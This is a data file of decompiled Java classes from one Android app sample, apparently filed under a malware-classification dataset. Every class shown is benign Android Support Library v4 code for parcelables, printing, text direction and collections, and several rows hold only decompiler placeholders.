"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.os\CompatCreator.code","static class CompatCreator<T> implements Parcelable.Creator<T> {   final ParcelableCompatCreatorCallbacks<T> mCallbacks;   public CompatCreator(  ParcelableCompatCreatorCallbacks<T> callbacks){     this.mCallbacks=callbacks;   }   @Override public T createFromParcel(  Parcel source){     return this.mCallbacks.createFromParcel(source,null);   }   @Override public T[] newArray(  int size){     return this.mCallbacks.newArray(size);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.os\EnvironmentCompat.code","public class EnvironmentCompat {   public static final String MEDIA_UNKNOWN=""unknown"";   private static final String TAG=""EnvironmentCompat"";   public static String getStorageState(  File path){     int version=Build.VERSION.SDK_INT;     if (version >= 19) {       return EnvironmentCompatKitKat.getStorageState(path);     }     try {       String canonicalPath=path.getCanonicalPath();       String canonicalExternal=Environment.getExternalStorageDirectory().getCanonicalPath();       if (canonicalPath.startsWith(canonicalExternal)) {         return Environment.getExternalStorageState();       }     }  catch (    IOException e) {       Log.w(TAG,""Failed to resolve canonical path: "" + e);     }     return MEDIA_UNKNOWN;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.os\EnvironmentCompatKitKat.code","class EnvironmentCompatKitKat {   EnvironmentCompatKitKat(){   }   public static String getStorageState(  File path){     return Environment.getStorageState(path);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.os\ParcelableCompat.code","public class ParcelableCompat {   public static <T>Parcelable.Creator<T> newCreator(  ParcelableCompatCreatorCallbacks<T> callbacks){     if (Build.VERSION.SDK_INT >= 13) {       ParcelableCompatCreatorHoneycombMR2Stub.instantiate(callbacks);     }     return new CompatCreator(callbacks);   } static class CompatCreator<T> implements Parcelable.Creator<T> {     final ParcelableCompatCreatorCallbacks<T> mCallbacks;     public CompatCreator(    ParcelableCompatCreatorCallbacks<T> callbacks){       this.mCallbacks=callbacks;     }     @Override public T createFromParcel(    Parcel source){       return this.mCallbacks.createFromParcel(source,null);     }     @Override public T[] newArray(    int size){       return this.mCallbacks.newArray(size);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.os\ParcelableCompatCreatorCallbacks.code","public interface ParcelableCompatCreatorCallbacks<T> {   T createFromParcel(  Parcel parcel,  ClassLoader classLoader);   T[] newArray(  int i); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.os\ParcelableCompatCreatorHoneycombMR2.code","class ParcelableCompatCreatorHoneycombMR2<T> implements Parcelable.ClassLoaderCreator<T> {   private final ParcelableCompatCreatorCallbacks<T> mCallbacks;   public ParcelableCompatCreatorHoneycombMR2(  ParcelableCompatCreatorCallbacks<T> callbacks){     this.mCallbacks=callbacks;   }   @Override public T createFromParcel(  Parcel in){     return this.mCallbacks.createFromParcel(in,null);   }   @Override public T createFromParcel(  Parcel in,  ClassLoader loader){     return this.mCallbacks.createFromParcel(in,loader);   }   @Override public T[] newArray(  int size){     return this.mCallbacks.newArray(size);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.os\ParcelableCompatCreatorHoneycombMR2Stub.code","class ParcelableCompatCreatorHoneycombMR2Stub {   ParcelableCompatCreatorHoneycombMR2Stub(){   }   public static <T>Parcelable.Creator<T> instantiate(  ParcelableCompatCreatorCallbacks<T> callbacks){     return new ParcelableCompatCreatorHoneycombMR2(callbacks);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.print\PrintHelper.code","public final class PrintHelper {   public static final int COLOR_MODE_COLOR=2;   public static final int COLOR_MODE_MONOCHROME=1;   public static final int SCALE_MODE_FILL=2;   public static final int SCALE_MODE_FIT=1;   PrintHelperVersionImpl mImpl; interface PrintHelperVersionImpl {     int getColorMode();     int getScaleMode();     void printBitmap(    String str,    Bitmap bitmap);     void printBitmap(    String str,    Uri uri) throws FileNotFoundException ;     void setColorMode(    int i);     void setScaleMode(    int i);   }   public static boolean systemSupportsPrint(){     return Build.VERSION.SDK_INT >= 19;   } private static final class PrintHelperStubImpl implements PrintHelperVersionImpl {     int mColorMode;     int mScaleMode;     private PrintHelperStubImpl(){       this.mScaleMode=2;       this.mColorMode=2;     }     @Override public void setScaleMode(    int scaleMode){       this.mScaleMode=scaleMode;     }     @Override public int getColorMode(){       return this.mColorMode;     }     @Override public void setColorMode(    int colorMode){       this.mColorMode=colorMode;     }     @Override public int getScaleMode(){       return this.mScaleMode;     }     @Override public void printBitmap(    String jobName,    Bitmap bitmap){     }     @Override public void printBitmap(    String jobName,    Uri imageFile){     }   } private static final class PrintHelperKitkatImpl implements PrintHelperVersionImpl {     private final PrintHelperKitkat printHelper;     PrintHelperKitkatImpl(    Context context){       this.printHelper=new PrintHelperKitkat(context);     }     @Override public void setScaleMode(    int scaleMode){       this.printHelper.setScaleMode(scaleMode);     }     @Override public int getScaleMode(){       return this.printHelper.getScaleMode();     }     @Override public void setColorMode(    int colorMode){       this.printHelper.setColorMode(colorMode);     }     @Override public int getColorMode(){       return this.printHelper.getColorMode();     }     @Override public void printBitmap(    String jobName,    Bitmap bitmap){       this.printHelper.printBitmap(jobName,bitmap);     }     @Override public void printBitmap(    String jobName,    Uri imageFile) throws FileNotFoundException {       this.printHelper.printBitmap(jobName,imageFile);     }   }   public PrintHelper(  Context context){     if (systemSupportsPrint()) {       this.mImpl=new PrintHelperKitkatImpl(context);     }  else {       this.mImpl=new PrintHelperStubImpl();     }   }   public void setScaleMode(  int scaleMode){     this.mImpl.setScaleMode(scaleMode);   }   public int getScaleMode(){     return this.mImpl.getScaleMode();   }   public void setColorMode(  int colorMode){     this.mImpl.setColorMode(colorMode);   }   public int getColorMode(){     return this.mImpl.getColorMode();   }   public void printBitmap(  String jobName,  Bitmap bitmap){     this.mImpl.printBitmap(jobName,bitmap);   }   public void printBitmap(  String jobName,  Uri imageFile) throws FileNotFoundException {     this.mImpl.printBitmap(jobName,imageFile);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.print\PrintHelperKitkat.code","public class PrintHelperKitkat {   public static final int COLOR_MODE_COLOR=2;   public static final int COLOR_MODE_MONOCHROME=1;   private static final String LOG_TAG=""PrintHelperKitkat"";   private static final int MAX_PRINT_SIZE=3500;   public static final int SCALE_MODE_FILL=2;   public static final int SCALE_MODE_FIT=1;   final Context mContext;   int mScaleMode=2;   int mColorMode=2;   public PrintHelperKitkat(  Context context){     this.mContext=context;   }   public void setScaleMode(  int scaleMode){     this.mScaleMode=scaleMode;   }   public int getScaleMode(){     return this.mScaleMode;   }   public void setColorMode(  int colorMode){     this.mColorMode=colorMode;   }   public int getColorMode(){     return this.mColorMode;   }   public void printBitmap(  final String jobName,  final Bitmap bitmap){     if (bitmap != null) {       final int fittingMode=this.mScaleMode;       PrintManager printManager=(PrintManager)this.mContext.getSystemService(""print"");       PrintAttributes.MediaSize mediaSize=PrintAttributes.MediaSize.UNKNOWN_PORTRAIT;       if (bitmap.getWidth() > bitmap.getHeight()) {         mediaSize=PrintAttributes.MediaSize.UNKNOWN_LANDSCAPE;       }       PrintAttributes attr=new PrintAttributes.Builder().setMediaSize(mediaSize).setColorMode(this.mColorMode).build();       printManager.print(jobName,new PrintDocumentAdapter(){         private PrintAttributes mAttributes;         @Override public void onLayout(        PrintAttributes oldPrintAttributes,        PrintAttributes newPrintAttributes,        CancellationSignal cancellationSignal,        PrintDocumentAdapter.LayoutResultCallback layoutResultCallback,        Bundle bundle){           this.mAttributes=newPrintAttributes;           PrintDocumentInfo info=new PrintDocumentInfo.Builder(jobName).setContentType(1).setPageCount(1).build();           boolean changed=newPrintAttributes.equals(oldPrintAttributes) ? false : true;           layoutResultCallback.onLayoutFinished(info,changed);         }         @Override public void onWrite(        PageRange[] pageRanges,        ParcelFileDescriptor fileDescriptor,        CancellationSignal cancellationSignal,        PrintDocumentAdapter.WriteResultCallback writeResultCallback){           float scale;           PrintedPdfDocument pdfDocument=new PrintedPdfDocument(PrintHelperKitkat.this.mContext,this.mAttributes);           try {             PdfDocument.Page page=pdfDocument.startPage(1);             RectF content=new RectF(page.getInfo().getContentRect());             Matrix matrix=new Matrix();             float scale2=content.width() / bitmap.getWidth();             if (fittingMode == 2) {               scale=Math.max(scale2,content.height() / bitmap.getHeight());             }  else {               scale=Math.min(scale2,content.height() / bitmap.getHeight());             }             matrix.postScale(scale,scale);             float translateX=(content.width() - (bitmap.getWidth() * scale)) / 2.0f;             float translateY=(content.height() - (bitmap.getHeight() * scale)) / 2.0f;             matrix.postTranslate(translateX,translateY);             page.getCanvas().drawBitmap(bitmap,matrix,null);             pdfDocument.finishPage(page);             try {               pdfDocument.writeTo(new FileOutputStream(fileDescriptor.getFileDescriptor()));               writeResultCallback.onWriteFinished(new PageRange[]{PageRange.ALL_PAGES});             }  catch (            IOException ioe) {               Log.e(PrintHelperKitkat.LOG_TAG,""Error writing printed content"",ioe);               writeResultCallback.onWriteFailed(null);             }             if (pdfDocument != null) {               pdfDocument.close();             }             if (fileDescriptor != null) {               try {                 fileDescriptor.close();               }  catch (              IOException e) {               }             }           }  catch (          Throwable th) {             if (pdfDocument != null) {               pdfDocument.close();             }             if (fileDescriptor != null) {               try {                 fileDescriptor.close();               }  catch (              IOException e2) {               }             }             throw th;           }         }       } ,attr);     }   }   public void printBitmap(  String jobName,  Uri imageFile) throws FileNotFoundException {     Bitmap bitmap=loadConstrainedBitmap(imageFile,MAX_PRINT_SIZE);     printBitmap(jobName,bitmap);   }   private Bitmap loadConstrainedBitmap(  Uri uri,  int maxSideLength) throws FileNotFoundException {     if (maxSideLength <= 0 || uri == null || this.mContext == null) {       throw new IllegalArgumentException(""bad argument to getScaledBitmap"");     }     BitmapFactory.Options opt=new BitmapFactory.Options();     opt.inJustDecodeBounds=true;     loadBitmap(uri,opt);     int w=opt.outWidth;     int h=opt.outHeight;     if (w <= 0 || h <= 0) {       return null;     }     int imageSide=Math.max(w,h);     int sampleSize=1;     while (imageSide > maxSideLength) {       imageSide>>>=1;       sampleSize<<=1;     }     if (sampleSize <= 0 || Math.min(w,h) / sampleSize <= 0) {       return null;     }     BitmapFactory.Options options=new BitmapFactory.Options();     options.inMutable=true;     options.inSampleSize=sampleSize;     return loadBitmap(uri,options);   }   private Bitmap loadBitmap(  Uri uri,  BitmapFactory.Options o) throws FileNotFoundException {     if (uri == null || this.mContext == null) {       throw new IllegalArgumentException(""bad argument to loadBitmap"");     }     InputStream is=null;     try {       is=this.mContext.getContentResolver().openInputStream(uri);       return BitmapFactory.decodeStream(is,null,o);     }   finally {       if (is != null) {         try {           is.close();         }  catch (        IOException t) {           Log.w(LOG_TAG,""close fail "",t);         }       }     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.print\PrintHelperKitkatImpl.code","private static final class PrintHelperKitkatImpl implements PrintHelperVersionImpl {   private final PrintHelperKitkat printHelper;   PrintHelperKitkatImpl(  Context context){     this.printHelper=new PrintHelperKitkat(context);   }   @Override public void setScaleMode(  int scaleMode){     this.printHelper.setScaleMode(scaleMode);   }   @Override public int getScaleMode(){     return this.printHelper.getScaleMode();   }   @Override public void setColorMode(  int colorMode){     this.printHelper.setColorMode(colorMode);   }   @Override public int getColorMode(){     return this.printHelper.getColorMode();   }   @Override public void printBitmap(  String jobName,  Bitmap bitmap){     this.printHelper.printBitmap(jobName,bitmap);   }   @Override public void printBitmap(  String jobName,  Uri imageFile) throws FileNotFoundException {     this.printHelper.printBitmap(jobName,imageFile);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.print\PrintHelperStubImpl.code","private static final class PrintHelperStubImpl implements PrintHelperVersionImpl {   int mColorMode;   int mScaleMode;   private PrintHelperStubImpl(){     this.mScaleMode=2;     this.mColorMode=2;   }   @Override public void setScaleMode(  int scaleMode){     this.mScaleMode=scaleMode;   }   @Override public int getColorMode(){     return this.mColorMode;   }   @Override public void setColorMode(  int colorMode){     this.mColorMode=colorMode;   }   @Override public int getScaleMode(){     return this.mScaleMode;   }   @Override public void printBitmap(  String jobName,  Bitmap bitmap){   }   @Override public void printBitmap(  String jobName,  Uri imageFile){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.print\PrintHelperVersionImpl.code","interface PrintHelperVersionImpl {   int getColorMode();   int getScaleMode();   void printBitmap(  String str,  Bitmap bitmap);   void printBitmap(  String str,  Uri uri) throws FileNotFoundException ;   void setColorMode(  int i);   void setScaleMode(  int i); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.text\AnyStrong.code","private static class AnyStrong implements TextDirectionAlgorithm {   private final boolean mLookForRtl;   public static final AnyStrong INSTANCE_RTL=new AnyStrong(true);   public static final AnyStrong INSTANCE_LTR=new AnyStrong(false);   @Override public int checkRtl(  CharSequence cs,  int start,  int count){     boolean haveUnlookedFor=false;     int e=start + count;     for (int i=start; i < e; i++) { switch (TextDirectionHeuristicsCompat.isRtlText(Character.getDirectionality(cs.charAt(i)))) { case 0:         if (this.mLookForRtl) {           return 0;         }       haveUnlookedFor=true;     break; case 1:   if (!this.mLookForRtl) {     return 1;   } haveUnlookedFor=true; break; } } if (haveUnlookedFor) { return !this.mLookForRtl ? 0 : 1; } return 2; } private AnyStrong(boolean lookForRtl){ this.mLookForRtl=lookForRtl; } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.text\BidiFormatter.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6b8db497"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.text\Builder.code","public static final class Builder {   private int mFlags;   private boolean mIsRtlContext;   private TextDirectionHeuristicCompat mTextDirectionHeuristicCompat;   public Builder(){     initialize(BidiFormatter.isRtlLocale(Locale.getDefault()));   }   public Builder(  boolean rtlContext){     initialize(rtlContext);   }   public Builder(  Locale locale){     initialize(BidiFormatter.isRtlLocale(locale));   }   private void initialize(  boolean isRtlContext){     this.mIsRtlContext=isRtlContext;     this.mTextDirectionHeuristicCompat=BidiFormatter.DEFAULT_TEXT_DIRECTION_HEURISTIC;     this.mFlags=2;   }   public Builder stereoReset(  boolean stereoReset){     if (stereoReset) {       this.mFlags|=2;     }  else {       this.mFlags&=-3;     }     return this;   }   public Builder setTextDirectionHeuristic(  TextDirectionHeuristicCompat heuristic){     this.mTextDirectionHeuristicCompat=heuristic;     return this;   }   private static BidiFormatter getDefaultInstanceFromContext(  boolean isRtlContext){     return isRtlContext ? BidiFormatter.DEFAULT_RTL_INSTANCE : BidiFormatter.DEFAULT_LTR_INSTANCE;   }   public BidiFormatter build(){     return (this.mFlags == 2 && this.mTextDirectionHeuristicCompat == BidiFormatter.DEFAULT_TEXT_DIRECTION_HEURISTIC) ? getDefaultInstanceFromContext(this.mIsRtlContext) : new BidiFormatter(this.mIsRtlContext,this.mFlags,this.mTextDirectionHeuristicCompat);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.text\DirectionalityEstimator.code","!org.eclipse.jdt.core.dom.TypeDeclaration@2552e7a2"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.text\FirstStrong.code","private static class FirstStrong implements TextDirectionAlgorithm {   public static final FirstStrong INSTANCE=new FirstStrong();   @Override public int checkRtl(  CharSequence cs,  int start,  int count){     int result=2;     int e=start + count;     for (int i=start; i < e && result == 2; i++) {       result=TextDirectionHeuristicsCompat.isRtlTextOrFormat(Character.getDirectionality(cs.charAt(i)));     }     return result;   }   private FirstStrong(){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.text\ICUCompat.code","public class ICUCompat {   private static final ICUCompatImpl IMPL; interface ICUCompatImpl {     String addLikelySubtags(    String str);     String getScript(    String str);   } static class ICUCompatImplBase implements ICUCompatImpl {     ICUCompatImplBase(){     }     @Override public String getScript(    String locale){       return null;     }     @Override public String addLikelySubtags(    String locale){       return locale;     }   } static class ICUCompatImplIcs implements ICUCompatImpl {     ICUCompatImplIcs(){     }     @Override public String getScript(    String locale){       return ICUCompatIcs.getScript(locale);     }     @Override public String addLikelySubtags(    String locale){       return ICUCompatIcs.addLikelySubtags(locale);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 14) {       IMPL=new ICUCompatImplIcs();     }  else {       IMPL=new ICUCompatImplBase();     }   }   public static String getScript(  String locale){     return IMPL.getScript(locale);   }   public static String addLikelySubtags(  String locale){     return IMPL.addLikelySubtags(locale);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.text\ICUCompatIcs.code","class ICUCompatIcs {   private static final String TAG=""ICUCompatIcs"";   private static Method sAddLikelySubtagsMethod;   private static Method sGetScriptMethod;   ICUCompatIcs(){   } static {     try {       Class<?> clazz=Class.forName(""libcore.icu.ICU"");       if (clazz != null) {         sGetScriptMethod=clazz.getMethod(""getScript"",String.class);         sAddLikelySubtagsMethod=clazz.getMethod(""addLikelySubtags"",String.class);       }     }  catch (    Exception e) {       Log.w(TAG,e);     }   }   public static String getScript(  String locale){     try {       if (sGetScriptMethod != null) {         Object[] args={locale};         return (String)sGetScriptMethod.invoke(null,args);       }     }  catch (    IllegalAccessException e) {       Log.w(TAG,e);     } catch (    InvocationTargetException e2) {       Log.w(TAG,e2);     }     return null;   }   public static String addLikelySubtags(  String locale){     try {       if (sAddLikelySubtagsMethod != null) {         Object[] args={locale};         return (String)sAddLikelySubtagsMethod.invoke(null,args);       }     }  catch (    IllegalAccessException e) {       Log.w(TAG,e);     } catch (    InvocationTargetException e2) {       Log.w(TAG,e2);     }     return locale;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.text\ICUCompatImpl.code","interface ICUCompatImpl {   String addLikelySubtags(  String str);   String getScript(  String str); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.text\ICUCompatImplBase.code","static class ICUCompatImplBase implements ICUCompatImpl {   ICUCompatImplBase(){   }   @Override public String getScript(  String locale){     return null;   }   @Override public String addLikelySubtags(  String locale){     return locale;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.text\ICUCompatImplIcs.code","static class ICUCompatImplIcs implements ICUCompatImpl {   ICUCompatImplIcs(){   }   @Override public String getScript(  String locale){     return ICUCompatIcs.getScript(locale);   }   @Override public String addLikelySubtags(  String locale){     return ICUCompatIcs.addLikelySubtags(locale);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.text\TextDirectionAlgorithm.code","public interface TextDirectionAlgorithm {   int checkRtl(  CharSequence charSequence,  int i,  int i2); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.text\TextDirectionHeuristicCompat.code","public interface TextDirectionHeuristicCompat {   boolean isRtl(  CharSequence charSequence,  int i,  int i2);   boolean isRtl(  char[] cArr,  int i,  int i2); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.text\TextDirectionHeuristicImpl.code","!org.eclipse.jdt.core.dom.TypeDeclaration@7d92b9a9"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.text\TextDirectionHeuristicInternal.code","private static class TextDirectionHeuristicInternal extends TextDirectionHeuristicImpl {   private final boolean mDefaultIsRtl;   private TextDirectionHeuristicInternal(  TextDirectionAlgorithm algorithm,  boolean defaultIsRtl){     super(algorithm);     this.mDefaultIsRtl=defaultIsRtl;   }   @Override protected boolean defaultIsRtl(){     return this.mDefaultIsRtl;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.text\TextDirectionHeuristicLocale.code","private static class TextDirectionHeuristicLocale extends TextDirectionHeuristicImpl {   public static final TextDirectionHeuristicLocale INSTANCE=new TextDirectionHeuristicLocale();   public TextDirectionHeuristicLocale(){     super(null);   }   @Override protected boolean defaultIsRtl(){     int dir=TextUtilsCompat.getLayoutDirectionFromLocale(Locale.getDefault());     return dir == 1;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.text\TextDirectionHeuristicsCompat.code","!org.eclipse.jdt.core.dom.TypeDeclaration@47331810"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.text\TextUtilsCompat.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6002379e"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.util\ArrayIterator.code","final class ArrayIterator<T> implements Iterator<T> {   boolean mCanRemove=false;   int mIndex;   final int mOffset;   int mSize;   ArrayIterator(  int offset){     this.mOffset=offset;     this.mSize=MapCollections.this.colGetSize();   }   @Override public boolean hasNext(){     return this.mIndex < this.mSize;   }   @Override public T next(){     T t=(T)MapCollections.this.colGetEntry(this.mIndex,this.mOffset);     this.mIndex++;     this.mCanRemove=true;     return t;   }   @Override public void remove(){     if (!this.mCanRemove) {       throw new IllegalStateException();     }     this.mIndex--;     this.mSize--;     this.mCanRemove=false;     MapCollections.this.colRemoveAt(this.mIndex);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.util\ArrayMap.code","public class ArrayMap<K,V> extends SimpleArrayMap<K,V> implements Map<K,V> {   MapCollections<K,V> mCollections;   public ArrayMap(){   }   public ArrayMap(  int capacity){     super(capacity);   }   public ArrayMap(  SimpleArrayMap map){     super(map);   }   private MapCollections<K,V> getCollection(){     if (this.mCollections == null) {       this.mCollections=new MapCollections<K,V>(){         @Override protected int colGetSize(){           return ArrayMap.this.mSize;         }         @Override protected Object colGetEntry(        int index,        int offset){           return ArrayMap.this.mArray[(index << 1) + offset];         }         @Override protected int colIndexOfKey(        Object key){           return key == null ? ArrayMap.this.indexOfNull() : ArrayMap.this.indexOf(key,key.hashCode());         }         @Override protected int colIndexOfValue(        Object value){           return ArrayMap.this.indexOfValue(value);         }         @Override protected Map<K,V> colGetMap(){           return ArrayMap.this;         }         @Override protected void colPut(        K key,        V value){           ArrayMap.this.put(key,value);         }         @Override protected V colSetValue(        int index,        V value){           return ArrayMap.this.setValueAt(index,value);         }         @Override protected void colRemoveAt(        int index){           ArrayMap.this.removeAt(index);         }         @Override protected void colClear(){           ArrayMap.this.clear();         }       } ;     }     return this.mCollections;   }   public boolean containsAll(  Collection<?> collection){     return MapCollections.containsAllHelper(this,collection);   }   @Override public void putAll(  Map<? extends K,? extends V> map){     ensureCapacity(this.mSize + map.size());     for (    Map.Entry<? extends K,? extends V> entry : map.entrySet()) {       put(entry.getKey(),entry.getValue());     }   }   public boolean removeAll(  Collection<?> collection){     return MapCollections.removeAllHelper(this,collection);   }   public boolean retainAll(  Collection<?> collection){     return MapCollections.retainAllHelper(this,collection);   }   @Override public Set<Map.Entry<K,V>> entrySet(){     return getCollection().getEntrySet();   }   @Override public Set<K> keySet(){     return getCollection().getKeySet();   }   @Override public Collection<V> values(){     return getCollection().getValues();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.util\AtomicFile.code","public class AtomicFile {   private final File mBackupName;   private final File mBaseName;   public AtomicFile(  File baseName){     this.mBaseName=baseName;     this.mBackupName=new File(baseName.getPath() + "".bak"");   }   public File getBaseFile(){     return this.mBaseName;   }   public void delete(){     this.mBaseName.delete();     this.mBackupName.delete();   }   public FileOutputStream startWrite() throws IOException {     if (this.mBaseName.exists()) {       if (!this.mBackupName.exists()) {         if (!this.mBaseName.renameTo(this.mBackupName)) {           Log.w(""AtomicFile"",""Couldn't rename file "" + this.mBaseName + "" to backup file ""+ this.mBackupName);         }       }  else {         this.mBaseName.delete();       }     }     try {       FileOutputStream str=new FileOutputStream(this.mBaseName);       return str;     }  catch (    FileNotFoundException e) {       File parent=this.mBaseName.getParentFile();       if (!parent.mkdir()) {         throw new IOException(""Couldn't create directory "" + this.mBaseName);       }       try {         FileOutputStream str2=new FileOutputStream(this.mBaseName);         return str2;       }  catch (      FileNotFoundException e2) {         throw new IOException(""Couldn't create "" + this.mBaseName);       }     }   }   public void finishWrite(  FileOutputStream str){     if (str != null) {       sync(str);       try {         str.close();         this.mBackupName.delete();       }  catch (      IOException e) {         Log.w(""AtomicFile"",""finishWrite: Got exception:"",e);       }     }   }   public void failWrite(  FileOutputStream str){     if (str != null) {       sync(str);       try {         str.close();         this.mBaseName.delete();         this.mBackupName.renameTo(this.mBaseName);       }  catch (      IOException e) {         Log.w(""AtomicFile"",""failWrite: Got exception:"",e);       }     }   }   public FileInputStream openRead() throws FileNotFoundException {     if (this.mBackupName.exists()) {       this.mBaseName.delete();       this.mBackupName.renameTo(this.mBaseName);     }     return new FileInputStream(this.mBaseName);   }   public byte[] readFully() throws IOException {     FileInputStream stream=openRead();     int pos=0;     try {       byte[] data=new byte[stream.available()];       while (true) {         int amt=stream.read(data,pos,data.length - pos);         if (amt <= 0) {           return data;         }         pos+=amt;         int avail=stream.available();         if (avail > data.length - pos) {           byte[] newData=new byte[pos + avail];           System.arraycopy(data,0,newData,0,pos);           data=newData;         }       }     }   finally {       stream.close();     }   }   static boolean sync(  FileOutputStream stream){     if (stream != null) {       try {         stream.getFD().sync();       }  catch (      IOException e) {         return false;       }     }     return true;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.util\ContainerHelpers.code","class ContainerHelpers {   static final int[] EMPTY_INTS=new int[0];   static final long[] EMPTY_LONGS=new long[0];   static final Object[] EMPTY_OBJECTS=new Object[0];   ContainerHelpers(){   }   public static int idealIntArraySize(  int need){     return idealByteArraySize(need * 4) / 4;   }   public static int idealLongArraySize(  int need){     return idealByteArraySize(need * 8) / 8;   }   public static int idealByteArraySize(  int need){     for (int i=4; i < 32; i++) {       if (need <= (1 << i) - 12) {         return (1 << i) - 12;       }     }     return need;   }   public static boolean equal(  Object a2,  Object b2){     return a2 == b2 || (a2 != null && a2.equals(b2));   }   public static int binarySearch(  int[] array,  int size,  int value){     int lo=0;     int hi=size - 1;     while (lo <= hi) {       int mid=(lo + hi) >>> 1;       int midVal=array[mid];       if (midVal < value) {         lo=mid + 1;       }  else {         if (midVal <= value) {           return mid;         }         hi=mid - 1;       }     }     return lo ^ (-1);   }   public static int binarySearch(  long[] array,  int size,  long value){     int lo=0;     int hi=size - 1;     while (lo <= hi) {       int mid=(lo + hi) >>> 1;       long midVal=array[mid];       if (midVal < value) {         lo=mid + 1;       }  else {         if (midVal <= value) {           return mid;         }         hi=mid - 1;       }     }     return lo ^ (-1);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.util\DebugUtils.code","public class DebugUtils {   public static void buildShortClassTag(  Object cls,  StringBuilder out){     int end;     if (cls == null) {       out.append(""null"");       return;     }     String simpleName=cls.getClass().getSimpleName();     if ((simpleName == null || simpleName.length() <= 0) && (end=(simpleName=cls.getClass().getName()).lastIndexOf(46)) > 0) {       simpleName=simpleName.substring(end + 1);     }     out.append(simpleName);     out.append('{');     out.append(Integer.toHexString(System.identityHashCode(cls)));   } } "
